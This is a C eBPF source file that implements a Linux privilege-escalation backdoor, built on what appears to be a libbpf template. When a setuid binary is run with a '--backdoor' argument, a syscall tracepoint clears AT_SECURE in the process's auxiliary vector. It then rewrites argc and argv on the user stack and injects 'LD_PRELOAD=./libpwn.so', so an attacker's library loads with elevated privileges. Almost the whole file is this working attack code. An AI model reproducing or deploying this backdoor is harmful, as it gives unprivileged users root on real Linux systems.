// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define BPRM_SECEXEC	4
#define AT_SECURE	23UL
#define AT_NULL		0UL

struct auxv_entry {
  u64 type;
  u64 val;
};

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, pid_t);
  __type(value, u64);
} secureexec SEC(".maps");

static inline int
memcmp(char *p1, char *p2, int n)
{
  for ( int i = 0; i < n; i++ )
    if ( *p1++ - *p2++ )
      return 1;
  return 0;
}

/*
// record if an exec elevates a process' privileges
SEC("lsm/bprm_creds_from_file")
int BPF_PROG(lsm_bprm_creds_from_file, struct linux_binprm *bprm, struct file *file, int ret)
{
  u64 i = 1L;
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  if ( !BPF_CORE_READ_BITFIELD(bprm, secureexec) )
    return 0;

  bpf_printk("secureexec tiggered from PID %d.\n", pid);
  bpf_map_update_elem(&secureexec, &pid, &i, BPF_ANY);

  return 0;
}
*/

// record if an exec elevates a process' privileges
SEC("kprobe/setup_new_exec")
int kprobe_setup_new_exec(struct pt_regs *ctx)
{
  struct linux_binprm *bprm = (struct linux_binprm *)PT_REGS_PARM1(ctx);
  u64 i = 1UL;
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  if ( !BPF_CORE_READ_BITFIELD_PROBED(bprm, secureexec) )
    return 0;

  bpf_printk("secureexec tiggered from PID %d\n", pid);
  bpf_map_update_elem(&secureexec, &pid, &i, BPF_ANY);

  return 0;
}

// overwrite AT_SECURE iff suid bin was executed with --backdoor switch
SEC("tp/syscalls/sys_exit_execve")
int tp_sys_exit_execve(struct trace_event_raw_sys_exit *tp)
{
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  struct task_struct *task;
  struct pt_regs *regs;
  u64 stack = 0, auxv = 0, envp = 0, zero = 0, one = 1;
  int argc, i, ret;
  char *arg = NULL, *env = NULL, buf[16] = {0};
  struct auxv_entry aux = { .type = 0, .val = 0 };

  // check if exec changed privileges and user wants a backdoor
  if ( !bpf_map_lookup_elem(&secureexec, &pid) )
    return 0;
  bpf_map_delete_elem(&secureexec, &pid);
  task = (struct task_struct *)bpf_get_current_task_btf();
  regs = (struct pt_regs *)bpf_task_pt_regs(task);
  stack = (u64)BPF_CORE_READ(regs, sp);
  bpf_probe_read_user(&argc, 4, (void*)stack);
  if ( argc != 2 )
    return 0;
  bpf_probe_read_user(&arg, 8, (void*)(stack + 16));
  bpf_probe_read_user(&buf, 15, (void*)arg);
  if ( memcmp("--backdoor", buf, 10) )
    return 0;
  bpf_printk("INFO backdoor triggered from PID %d\n", pid);

  // overwrite AT_SECURE on the stack
  for ( i = 0, envp = stack + 4*sizeof(u64); i < 100; i++, envp+=8 ){
    bpf_probe_read_user(&env, 8, (void*)envp);
    if ( !env )
      break;
  }
  for ( i = 0, auxv = envp + 8; i < 100; i++, auxv+=16 ){
    bpf_probe_read_user(&aux, 16, (void*)auxv);
    if ( aux.type == AT_NULL ){ // last entry of auxv
      break;
    }
    if ( aux.type == AT_SECURE ){
      if ( aux.val != 1UL ){
        bpf_printk("BUG AT_SECURE not set");
	return 0;
      }
      if ( bpf_probe_write_user((void*)(auxv+8), &zero, 8) < 0 ){
        bpf_printk("BUG write to AT_SECURE failed");
	return 0;
      }
    }
  }

  // insert fake environment variable by shrinking argv
  // string written to AT_NULL's value and rand bytes, strlen < 25
  env = auxv + 8; // addrof fake env var
  if ( bpf_probe_write_user((void*)stack, &one, 8) < 0 ){
    bpf_printk("BUG write to &argc failed");
    return 0;
  }
  if ( bpf_probe_write_user((void*)(stack + 2*sizeof(u64)), &zero, 8) ){
    bpf_printk("BUG write to &argv[1] failed");
    return 0;
  }
  if ( bpf_probe_write_user((void*)(stack + 3*sizeof(u64)), &env, 8) ){
    bpf_printk("BUG write to &envp[-1] failed");
    return 0;
  }
  if ( bpf_probe_write_user((void*)env, "LD_PRELOAD=./libpwn.so", 23) ){
    bpf_printk("BUG write of fake env var failed");
    return 0;
  }

  return 0;
}
